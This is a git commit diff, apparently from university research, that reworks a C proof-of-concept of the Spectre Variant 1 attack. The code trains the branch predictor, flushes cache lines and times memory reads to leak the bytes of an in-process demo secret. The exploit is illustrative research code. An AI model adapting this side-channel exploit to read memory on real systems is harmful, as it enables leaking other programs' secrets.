224d3c53472a13f6cd122ee5842bb85f4cbd7b3a
KYurtseven <kcyurtseven@wpi.edu>
2019-10-15 15:49:47 -0400

    AMD work1

--- AMD/Spectre/Variant1/spectre.c
+++ AMD/Spectre/Variant1/spectre.c
@@ -3,171 +3,142 @@
 #include <malloc.h>
 #include <unistd.h>
 #include <stdlib.h>
-
-#define CACHE_HIT_THRESHOLD 300
-
-// flush the address from the memory 
-#define clflush(_addr) asm volatile("clflush (%0)" : : "r" (_addr));
-
-// measure the time
-// access to the mem location
-// measure the time again
-// find difference between 2 timer
-// put the difference in _time variable, or rax
-// rdtscp changes rax and rdx, that is why rdx in the
-// third column of the assembly code
-#define measure_time(_time, _addr) asm volatile(\
-				"mfence\n"\
-				"lfence\n"\
-				"rdtscp\n"\
-				"mov %%rax, %%r10\n"\
-				"mov (%1), %%rcx\n"\
-				"rdtscp;\n"\
-				"sub %%r10, %%rax\n"\
-				: "=a"(_time)\
-				: "b"(_addr)\
-				: "rcx", "r10", "rdx");
-
-
-
-
-// flushs the probe array
-#define clflush_array(_array)\
-	for (int j = 0; j < 256; j++)\
-	{\
-		clflush(&_array[j * 4096]);\
-	}\
-	asm volatile("mfence");
+#include "fnr_helper.h"
 
 // Functions are taken from
 // https://www.paulkocher.com/doc/MicrosoftCompilerSpectreMitigation.html
-u_int8_t array[256 * 4096];
-u_int8_t temp = 0;
+
+#define CACHE_HIT_THRESHOLD 320
+
+int unused3[64];
+uint8_t array[256 * 4096];
+uint8_t temp = 0;
+int unused1[64];
 int bufferSize = 16;
-int bufferSizeMask = 0x0f;
-uint8_t buffer[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};
+int unused2[64];
+uint8_t buffer[160] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
 char secret[] = "The Magic Words are Squeamish Ossifrage.";
+uint8_t bigNumberBuffer[4096 * 256];
 
-// SPECTRE V1
+void find_highest_score(int* scores);
+void train_victim(int tries, size_t malicious_x);
 
+uint8_t junk = 3;
 void victim_function(size_t x){
-	if(x < bufferSize){
+	if( x < (	bigNumberBuffer[1 * 4096] +
+				bigNumberBuffer[225 * 4096]+
+				bigNumberBuffer[7 * 4096] +
+				bigNumberBuffer[12 * 4096]
+			) &&
+		x < (	bigNumberBuffer[20 * 4096] +
+				bigNumberBuffer[190 * 4096]
+		) &&
+		x < bufferSize){
+		// read the array's element to temp
 		temp &= array[buffer[x] * 4096];
 	}
 }
 
-
-/**
- * Finds cached entry of the array
- * Iterates over 256 entries to find latencies smaller than threshold
- */
-void find_cached_index(int* scores){
-
-	uint64_t time_dif;
-	int mix_i;
-	for(int i = 0; i < 256; i++){
-
-		mix_i = ((i * 167) + 13) & 255;
-		time_dif = 0;
-
-		measure_time(time_dif, &array[mix_i * 4096]);
-
-		if(time_dif < CACHE_HIT_THRESHOLD){
-			//printf("Timedif:%ld \t mix_i:%d\n", time_dif, mix_i);
-			scores[mix_i]++;
-		}
-	}
-}
-
-
-/**
- * Finds highest score in the scores array
- */
 void find_highest_score(int* scores){
 	int maxScore = 0;
 	int maxIndex = 0;
-	for (int i = 1; i < 256; i++){
+
+	for (int i = 0; i < 256; i++){
 		if(scores[i] > maxScore){
 			maxIndex = i;
 			maxScore = scores[i];
 		}
 	}
-	printf("Letter: %c\t Index: %d\t number of hits:%d\n", maxIndex, maxIndex, maxScore);
+	printf("Letter: %c\t Index: %d\t Hits:%d \n", maxIndex, maxIndex, maxScore);
 }
 
 void train_victim(int tries, size_t malicious_x){
-	// new training
-	size_t training_x, x;
-	training_x = tries % bufferSize;
-
-	for (int j = 29; j >= 0; j--) {
-		clflush(&bufferSize);
-		clflush_array(array);
-		//asm volatile("mfence\n");
-		//for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
-
-		/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-		/* Avoid jumps in case those tip off the branch predictor */
-		x = ((j % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-		x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
-		x = training_x ^ (x & (malicious_x ^ training_x));
-		
-		//victim_function(j % 12);
-		/* Call the victim! */
-		victim_function(x);
-	}
-	for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
-	//clflush_array(array);
-	//clflush(&bufferSize);
+	
+	clflush_array(array);
 
 	/*
-	for (int i = 0; i < 40; i++){
-		
-		victim_function(0);
-
-		//clflush_array(array);
-		clflush(&bufferSize);
+	size_t training_x = tries % bufferSize;
+	int x;
+	
+	for(int i = 0; i < 6; i++){
+		for(int j = 5; j >= 0; j--){
+			for (volatile int z = 0; z < 200; z++) {}
+			clflush(&bufferSize);
+			clflush_array(bigNumberBuffer);
+			for (volatile int z = 0; z < 200; z++) {}
+			victim_function(0);
+		}
+		victim_function(malicious_x);
 	}
-	asm volatile("lfence\n");
-	clflush_array(array);
-	clflush(&bufferSize);
 	*/
-}
-
-void steal_byte(int* scores, int larger_x){
-	// do the experiment 1000 Times
-	for(int it = 0; it < 999; it++){
-		train_victim(it, larger_x);
-
-		//victim_function(larger_x);
+	
+	size_t training_x = tries % bufferSize;
+	
+	int x;
+	for (int j = 29; j >= 0; j--) {
+		clflush(&bufferSize);
+		clflush_array(bigNumberBuffer);
+		for (volatile int z = 0; z < 100; z++) {}
 		
-		find_cached_index(scores);
+		x = ((j % 6) - 1) & ~0xFFFF;
+		x = (x | (x >> 16));
+		x = training_x ^ (x & (malicious_x ^ training_x));
+		victim_function((j % 6) == 0 ? malicious_x : 0); 
+		//victim_function(x);
 	}
-	find_highest_score(scores);
+	
 }
 
 // Code for Spectre Variant 1
 int main(){
+	uint64_t time_dif;
+	int mix_j, j;
+	size_t larger_x;
 	// initialize the array
 	for (int i = 0; i < 256 * 4096; i++){
 		array[i] = i % 256;
 	}
+	// initialize bigNumberBuffer
+	for(int i = 0; i < 256; i++){
+		for (int k = 0; k < 4096; k++)
+		{
+			bigNumberBuffer[i * 4096 + k] = i % 256;
+		}
+	}
+	//printf("buf248*4096:%d\n", bigNumberBuffer[248 * 4096]);
 	// steal the secret, secret is 40 byte long
-	
-	for(int i = 0; i < 40; i++){
+	for(int i = 0; i < 3; i++){
 		clflush_array(array);
-
+		
 		// initialize scores
 		int* scores =(int*) malloc(256 * sizeof(int));
-		for (int j = 0; j < 256; j++)
+		for (int i = 0; i < 256; i++)
 		{
-			scores[j] = 0;
+			scores[i] = 0;
 		}
 		// out of bounds access
-		size_t larger_x = (size_t)(secret - (char*)buffer + i);
-		//size_t larger_x = 11 + i;
+		larger_x = (size_t)(secret - (char*)buffer + i);
+			
+		for(int it = 0; it < 40; it++){
+			
+			// train and access
+			train_victim(it, larger_x);
+			
+			// find cached index
+			for(j = 0; j < 256; j++){
+				mix_j = ((j * 167) + 13) & 255;
+				time_dif = 0;
 
-		steal_byte(scores, larger_x);
+				measure_time(time_dif, &array[mix_j * 4096]);
+
+				if(time_dif < CACHE_HIT_THRESHOLD && mix_j != 0){
+					scores[mix_j]++;
+				}
+			}
+		}
+		
+		
+		find_highest_score(scores);
 
 		free(scores);
 	}
